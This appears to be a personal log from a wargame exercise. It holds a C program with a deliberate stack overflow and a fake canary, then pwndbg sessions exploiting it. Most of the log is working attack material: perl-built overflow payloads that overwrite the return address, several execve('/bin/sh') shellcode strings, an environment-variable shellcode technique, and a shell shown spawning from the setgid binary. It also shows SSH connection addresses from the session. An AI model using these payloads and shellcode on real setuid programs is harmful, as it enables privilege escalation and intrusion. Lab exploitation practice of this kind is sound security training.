#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFSIZE 32

typedef struct{
	char buf[BUFSIZE];
	char canary[10];
} st_t;

char canary[10] = "Kenny\0";

int vuln(char* str){
	st_t st = {
		.buf = "",
		.canary = "Kenny\0"
	};

	strcpy(st.buf,str);

	if(strncmp(st.canary,canary,5) == 0)
	{
		printf("Nice, Kenny is alive: %s", st.buf);
		return 0;
	}
	else
	{
		printf("Oh no! you killed Kenny!\n");
		exit(1);
	}
}


int main(int argc, char **argv){
        if (argc < 2){
                printf("missing parameters...");
                return -1;
        }
        vuln(argv[1]);
        return 0;       
}


m918111@bin:~/mission2$ ls -l
total 20
-r--r----- 1 root    lev2      20 May  6 05:10 flag
-r-xr-sr-x 1 nobody  lev2    7556 May  6 05:10 mission2
-rw-r--r-- 1 m918111 m918111  633 May  6 05:10 mission2.c
drwxr-xr-x 2 m918111 root    4096 May  6 05:10 writable
m918111@bin:~/mission2$ gdb mission2
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 177 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from mission2...(no debugging symbols found)...done.
pwndbg> disassemble vuln
Dump of assembler code for function vuln:
   0x080484cb <+0>:	push   ebp
   0x080484cc <+1>:	mov    ebp,esp
   0x080484ce <+3>:	push   ebx
   0x080484cf <+4>:	sub    esp,0x34                         ======================52bytes=====================
   0x080484d2 <+7>:	mov    DWORD PTR [ebp-0x32],0x0
   0x080484d9 <+14>:	lea    eax,[ebp-0x2e]
   0x080484dc <+17>:	mov    ecx,0x1c
   0x080484e1 <+22>:	mov    ebx,0x0
   0x080484e6 <+27>:	mov    DWORD PTR [eax],ebx
   0x080484e8 <+29>:	mov    DWORD PTR [eax+ecx*1-0x4],ebx
   0x080484ec <+33>:	lea    edx,[eax+0x4]
   0x080484ef <+36>:	and    edx,0xfffffffc
   0x080484f2 <+39>:	sub    eax,edx
   0x080484f4 <+41>:	add    ecx,eax
   0x080484f6 <+43>:	and    ecx,0xfffffffc
   0x080484f9 <+46>:	and    ecx,0xfffffffc
   0x080484fc <+49>:	mov    eax,0x0
   0x08048501 <+54>:	mov    DWORD PTR [edx+eax*1],ebx
   0x08048504 <+57>:	add    eax,0x4
   0x08048507 <+60>:	cmp    eax,ecx
   0x08048509 <+62>:	jb     0x8048501 <vuln+54>
   0x0804850b <+64>:	add    edx,eax
   0x0804850d <+66>:	mov    eax,ds:0x80486a2
   0x08048512 <+71>:	mov    DWORD PTR [ebp-0x12],eax
   0x08048515 <+74>:	movzx  eax,WORD PTR ds:0x80486a6
   0x0804851c <+81>:	mov    WORD PTR [ebp-0xe],ax
   0x08048520 <+85>:	movzx  eax,BYTE PTR ds:0x80486a8
   0x08048527 <+92>:	mov    BYTE PTR [ebp-0xc],al
   0x0804852a <+95>:	mov    WORD PTR [ebp-0xb],0x0
   0x08048530 <+101>:	mov    BYTE PTR [ebp-0x9],0x0
   0x08048534 <+105>:	sub    esp,0x8
   0x08048537 <+108>:	push   DWORD PTR [ebp+0x8]
   0x0804853a <+111>:	lea    eax,[ebp-0x32]
   0x0804853d <+114>:	push   eax
   0x0804853e <+115>:	call   0x8048370 <strcpy@plt>
   0x08048543 <+120>:	add    esp,0x10
   0x08048546 <+123>:	sub    esp,0x4
   0x08048549 <+126>:	push   0x5
   0x0804854b <+128>:	push   0x804a02c
   0x08048550 <+133>:	lea    eax,[ebp-0x32]
   0x08048553 <+136>:	add    eax,0x20
   0x08048556 <+139>:	push   eax
   0x08048557 <+140>:	call   0x80483b0 <strncmp@plt>   ============================duibi===========================
   0x0804855c <+145>:	add    esp,0x10
   0x0804855f <+148>:	test   eax,eax
   0x08048561 <+150>:	jne    0x804857e <vuln+179>
   0x08048563 <+152>:	sub    esp,0x8
   0x08048566 <+155>:	lea    eax,[ebp-0x32]
   0x08048569 <+158>:	push   eax
   0x0804856a <+159>:	push   0x8048670
   0x0804856f <+164>:	call   0x8048360 <printf@plt>
   0x08048574 <+169>:	add    esp,0x10
   0x08048577 <+172>:	mov    eax,0x0
   0x0804857c <+177>:	jmp    0x8048598 <vuln+205>
   0x0804857e <+179>:	sub    esp,0xc
   0x08048581 <+182>:	push   0x8048689
   0x08048586 <+187>:	call   0x8048380 <puts@plt>
   0x0804858b <+192>:	add    esp,0x10
   0x0804858e <+195>:	sub    esp,0xc
   0x08048591 <+198>:	push   0x1
   0x08048593 <+200>:	call   0x8048390 <exit@plt>
   0x08048598 <+205>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804859b <+208>:	leave
   0x0804859c <+209>:	ret
End of assembler dump.

pwndbg> r $(perl -e 'print "A"x32 . "Kenny" . "B"x13 . "DDDDEEEE"')
Starting program: /home/m918111/mission2/mission2 $(perl -e 'print "A"x32 . "Kenny" . "B"x13 . "DDDDEEEE"')

Breakpoint 1, 0x080484cf in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────
 EAX  0xffffc758 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKennyBBBBBBBBBBBBBDDDDEEEE'
 EBX  0x0
 ECX  0xffffc560 ◂— 0x2
 EDX  0xffffc584 ◂— 0x0
 EDI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 EBP  0xffffc528 —▸ 0xffffc548 ◂— 0x0
 ESP  0xffffc524 ◂— 0x0
 EIP  0x80484cf (vuln+4) ◂— sub    esp, 0x34
──────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────
 ► 0x80484cf <vuln+4>     sub    esp, 0x34
   0x80484d2 <vuln+7>     mov    dword ptr [ebp - 0x32], 0
   0x80484d9 <vuln+14>    lea    eax, [ebp - 0x2e]
   0x80484dc <vuln+17>    mov    ecx, 0x1c
   0x80484e1 <vuln+22>    mov    ebx, 0
   0x80484e6 <vuln+27>    mov    dword ptr [eax], ebx
   0x80484e8 <vuln+29>    mov    dword ptr [eax + ecx - 4], ebx
   0x80484ec <vuln+33>    lea    edx, [eax + 4]
   0x80484ef <vuln+36>    and    edx, 0xfffffffc
   0x80484f2 <vuln+39>    sub    eax, edx
   0x80484f4 <vuln+41>    add    ecx, eax
───────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────
00:0000│ esp  0xffffc524 ◂— 0x0
01:0004│ ebp  0xffffc528 —▸ 0xffffc548 ◂— 0x0
02:0008│      0xffffc52c —▸ 0x80485dd (main+64) ◂— add    esp, 0x10
03:000c│      0xffffc530 —▸ 0xffffc758 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKennyBBBBBBBBBBBBBDDDDEEEE'
04:0010│      0xffffc534 —▸ 0xffffc5f4 —▸ 0xffffc738 ◂— '/home/m918111/mission2/mission2'
05:0014│      0xffffc538 —▸ 0xffffc600 —▸ 0xffffc793 ◂— 'XDG_SESSION_ID=c15580'
06:0018│      0xffffc53c —▸ 0x8048611 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]
07:001c│      0xffffc540 —▸ 0xf7fc83dc (__exit_funcs) —▸ 0xf7fc91e0 (initial) ◂— 0
─────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────
 ► f 0  80484cf vuln+4
   f 1  80485dd main+64
   f 2 f7e2e637 __libc_start_main+247
Breakpoint vuln
pwndbg> continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x42424242 ('BBBB')
 ECX  0x7fffffaf
 EDX  0xf7fc9870 (_IO_stdfile_1_lock) ◂— 0
 EDI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 EBP  0x44444444 ('DDDD')
 ESP  0xffffc530 —▸ 0xffffc700 —▸ 0xffffc72b ◂— 'i686'
 EIP  0x45454545 ('EEEE')
──────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────
Invalid address 0x45454545










───────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────
00:0000│ esp  0xffffc530 —▸ 0xffffc700 —▸ 0xffffc72b ◂— 'i686'
01:0004│      0xffffc534 —▸ 0xffffc5f4 —▸ 0xffffc738 ◂— '/home/m918111/mission2/mission2'
02:0008│      0xffffc538 —▸ 0xffffc600 —▸ 0xffffc793 ◂— 'XDG_SESSION_ID=c15580'
03:000c│      0xffffc53c —▸ 0x8048611 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]
04:0010│      0xffffc540 —▸ 0xf7fc83dc (__exit_funcs) —▸ 0xf7fc91e0 (initial) ◂— 0
05:0014│      0xffffc544 —▸ 0xffffc560 ◂— 0x2
06:0018│      0xffffc548 ◂— 0x0
07:001c│      0xffffc54c —▸ 0xf7e2e637 (__libc_start_main+247) ◂— add    esp, 0x10
─────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────
 ► f 0 45454545
Program received signal SIGSEGV (fault address 0x45454545)
pwndbg>



r $(perl -e 'print "\x90"x7 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "Kenny" . "\x90"x13 . "AAAABBBB" ')

0xffffc4cc:	0xf7e5f670	0xffffc4f6	0xf7ffd918	0xf7e5f675
0xffffc4dc:	0x08048574	0x08048670	0xffffc4f6	0x00000005
0xffffc4ec:	0x08048296	0x00000000	0x9090c594	0x90909090

0xffffc4fc:	0x50c03190	0x732f2f68	0x622f6868	0xe3896e69
0xffffc50c:	0x53e28950	0x0bb0e189	0x654b80cd	0x90796e6e

0xffffc51c:	0x90909090	0x90909090	0x90909090	0x41414141
0xffffc52c:	0x42424242	0xffffc700	0xffffc5f4	0xffffc600
0xffffc53c:	0x08048611	0xf7fc83dc	0xffffc560	0x00000000

r  $(perl -e 'print "\x90"x7 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "Kenny" . "\x90"x13 . "\xfc\xc4\xff\xff"x2 ')


 ► 0x8048557 <vuln+140>    call   strncmp@plt <0x80483b0>
        s1: 0xffffc516 ◂— 'Kenny'
        s2: 0x804a02c (canary) ◂— 'Kenny'
        n: 0x5

r $(perl -e 'print "\x90"x7 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "Kenny" . "B"x13 . "\xfc\xc4\xff\xff"x2')


   0x8048574  <vuln+169>    add    esp, 0x10
   0x8048577  <vuln+172>    mov    eax, 0
   0x804857c  <vuln+177>    jmp    vuln+205 <0x8048598>
    ↓
   0x8048598  <vuln+205>    mov    ebx, dword ptr [ebp - 4]
   0x804859b  <vuln+208>    leave
 ► 0x804859c  <vuln+209>    ret    <0xffffc4fc>
    ↓
   0xffffc4fc               nop
   0xffffc4fd               xor    eax, eax
   0xffffc4ff               push   eax
   0xffffc500               push   0x68732f2f
   0xffffc505               push   0x6e69622f




 r $(perl -e 'print "\x90"x7 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "Kenny" . "\x90"x13 . "\xfc\xc4\xff\xff"x2')
Starting program: /home/m918111/mission2/mission2 $(perl -e 'print "\x90"x7 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "Kenny" . "\x90"x13 . "\xfc\xc4\xff\xff"x2')
process 31415 is executing new program: /bin/dash
$


20bytes shellcode
\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80

r $(perl -e 'print "\x90"x12 . "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "Kenny" . "\x90"x13 . "\xfc\xc4\xff\xff"x2')


   0xffffc4fc               nop
   0xffffc4fd               nop
   0xffffc4fe               nop
   0xffffc4ff               nop
   0xffffc500               nop
   0xffffc501               nop
   0xffffc502               xor    ecx, ecx
   0xffffc504               push   0xb
   0xffffc506               pop    eax
   0xffffc507               push   ecx



r $(perl -e 'print "\x90"x7 . "\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80" . "Kenny" . "\x90"x13 . "\xf8\xc4\xff\xff"x2')


$(perl -e 'print "\x90"x10 . "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" . "Kenny" . "\x90"x13 . "\xf8\xc4\xff\xff"x2') 

\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\xb0\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
设置环境变量shellcode
export EGG=`python2 -c 'print "\x90"*300 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\xb0\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`


利用gdb查找EGG位置：

 r $(perl -e 'print "\x90"x10 . "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" . "Kenny" . "\x90"x13 . "\xf8\xc4\xff\xff"x2')

 >>>x/100s $esp+120*4


0xffffd678:	"SSH_CLIENT=93.66.47.41 61738 22"
0xffffd698:	"SSH_TTY=/dev/pts/22"

0xffffd6ac:	"EGG=", '\220' <repeats 196 times>...

0xffffd774:	'\220' <repeats 104 times>, "\353\037^\211v\b1\300\210F\a\211F\f\260\260\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh"
0xffffd80a:	"USER=m918111"
0xffffd817:	"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...
0xffffd8df:	"=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=0"...
0xffffd9a7:	"1;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo"...
0xffffda6f:	"=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:"...
0xffffdb37:	"*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt"...
0xffffdbff:	"=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.o"...
0xffffdcc7:	"gv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;3"...
0xffffdd8f:	"6:*.xspf=00;36:"
0xffffdd9f:	"COLUMNS=238"
0xffffddab:	"PATH=/home/m918111/bin:/home/m918111/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
0xffffde3e:	"MAIL=/var/mail/m918111"
0xffffde55:	"_=/usr/bin/gdb"
0xffffde64:	"PWD=/home/m918111/mission2"
0xffffde7f:	"LANG=en_US.UTF-8"
0xffffde90:	"LINES=49"
0xffffde99:	"HOME=/home/m918111"
0xffffdeac:	"SHLVL=1"
0xffffdeb4:	"LANGUAGE=en_US:en"
0xffffdec6:	"LC_TERMINAL_VERSION=3.3.0"
0xffffdee0:	"LOGNAME=m918111"
0xffffdef0:	"SSH_CONNECTION=93.66.47.41 61738 131.175.14.151 22"
0xffffdf23:	"XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop"
0xffffdf64:	"LESSOPEN=| /usr/bin/lesspipe %s"
0xffffdf84:	"LC_TERMINAL=iTerm2"
0xffffdf97:	"XDG_RUNTIME_DIR=/run/user/1067"
0xffffdfb6:	"LESSCLOSE=/usr/bin/lesspipe %s %s"
0xffffdfd8:	"/home/m918111/mission2/mission2"


x/512bx 0xffffd6ac
0xffffd6ac:	0x45	0x47	0x47	0x3d	0x90	0x90	0x90	0x90
0xffffd6b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6dc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6e4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6ec:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6f4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd6fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd704:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd70c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd714:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd71c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd724:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd72c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd734:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd73c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd744:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd74c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd754:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd75c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd764:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd76c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd774:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd77c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd784:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd78c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd794:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd79c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd7a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd7ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd7b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd7bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd7c4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd7cc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd7d4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd7dc:	0xeb	0x1f	0x5e	0x89	0x76	0x08	0x31	0xc0
0xffffd7e4:	0x88	0x46	0x07	0x89	0x46	0x0c	0xb0	0xb0
0xffffd7ec:	0x89	0xf3	0x8d	0x4e	0x08	0x8d	0x56	0x0c
0xffffd7f4:	0xcd	0x80	0x31	0xdb	0x89	0xd8	0x40	0xcd
0xffffd7fc:	0x80	0xe8	0xdc	0xff	0xff	0xff	0x2f	0x62
0xffffd804:	0x69	0x6e	0x2f	0x73	0x68	0x00	0x55	0x53
0xffffd80c:	0x45	0x52	0x3d	0x6d	0x39	0x31	0x38	0x31
0xffffd814:	0x31	0x31	0x00	0x4c	0x53	0x5f	0x43	0x4f
0xffffd81c:	0x4c	0x4f	0x52	0x53	0x3d	0x72	0x73	0x3d
0xffffd824:	0x30	0x3a	0x64	0x69	0x3d	0x30	0x31	0x3b
0xffffd82c:	0x33	0x34	0x3a	0x6c	0x6e	0x3d	0x30	0x31
0xffffd834:	0x3b	0x33	0x36	0x3a	0x6d	0x68	0x3d	0x30
0xffffd83c:	0x30	0x3a	0x70	0x69	0x3d	0x34	0x30	0x3b
0xffffd844:	0x33	0x33	0x3a	0x73	0x6f	0x3d	0x30	0x31
0xffffd84c:	0x3b	0x33	0x35	0x3a	0x64	0x6f	0x3d	0x30
0xffffd854:	0x31	0x3b	0x33	0x35	0x3a	0x62	0x64	0x3d
0xffffd85c:	0x34	0x30	0x3b	0x33	0x33	0x3b	0x30	0x31
0xffffd864:	0x3a	0x63	0x64	0x3d	0x34	0x30	0x3b	0x33
0xffffd86c:	0x33	0x3b	0x30	0x31	0x3a	0x6f	0x72	0x3d
0xffffd874:	0x34	0x30	0x3b	0x33	0x31	0x3b	0x30	0x31
0xffffd87c:	0x3a	0x6d	0x69	0x3d	0x30	0x30	0x3a	0x73
0xffffd884:	0x75	0x3d	0x33	0x37	0x3b	0x34	0x31	0x3a
0xffffd88c:	0x73	0x67	0x3d	0x33	0x30	0x3b	0x34	0x33
0xffffd894:	0x3a	0x63	0x61	0x3d	0x33	0x30	0x3b	0x34
0xffffd89c:	0x31	0x3a	0x74	0x77	0x3d	0x33	0x30	0x3b
0xffffd8a4:	0x34	0x32	0x3a	0x6f	0x77	0x3d	0x33	0x34



0xffffddf5:	"SHELLCODE25=", '\220' <repeats 100 times>, "\231\367\342\215\b\276//sh\277/binQVW\215\034$\260\v̀"

0xffffddf1:	"SHELLCODE55=", '\220' <repeats 100 times>, "\061\300\260F1\333\061\311̀\353\026[1\300\210C\a\211[\b\211C\f\260\v\215K\b\215S\f̀\350\345\377\377\377/bin/shNXXXXYYYY"


